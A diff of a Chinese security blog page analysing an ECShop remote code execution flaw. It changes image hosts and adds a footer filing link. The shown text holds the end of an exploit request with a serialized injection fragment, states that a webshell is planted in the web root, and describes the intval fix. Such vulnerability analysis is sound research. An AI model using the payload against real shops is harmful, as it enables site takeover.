-&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p>最后会在根目录下生成一个马。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/tcp7f.png" alt="21"></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/4mnmk.png" alt="22"></p>
-<h2 id="0x03-修复方式"><a href="#0x03-修复方式" class="headerlink" title="0x03 修复方式"></a>0x03 修复方式</h2><p>&emsp;&emsp;我们可以看到最新版在 <strong>$arr[‘num’]</strong> 和 <strong>\$arr[‘id’]</strong> 中加入了intval，强制类型转换来修复。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/0i01f.png" alt="23"></p>
+<p>最后会在根目录下生成一个马。<br><img src="http://l1nk3r.xmutsec.com/blog/tcp7f.png" alt="21"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/4mnmk.png" alt="22"></p>
+<h2 id="0x03-修复方式"><a href="#0x03-修复方式" class="headerlink" title="0x03 修复方式"></a>0x03 修复方式</h2><p>&emsp;&emsp;我们可以看到最新版在 <strong>$arr[‘num’]</strong> 和 <strong>\$arr[‘id’]</strong> 中加入了intval，强制类型转换来修复。<br><img src="http://l1nk3r.xmutsec.com/blog/0i01f.png" alt="23"></p>
 <h2 id="0x04-思考"><a href="#0x04-思考" class="headerlink" title="0x04 思考"></a>0x04 思考</h2><p>&emsp;&emsp;PHP下这种模板引起的RCE好像不少见了，seacms的那个好像也是因为这个引起的，但是吧，这个问题为啥自己没审计到呢，归根到底还是太菜了。</p>
 <h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><p><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a><br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a></p>
 
@@ -292,6 +292,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
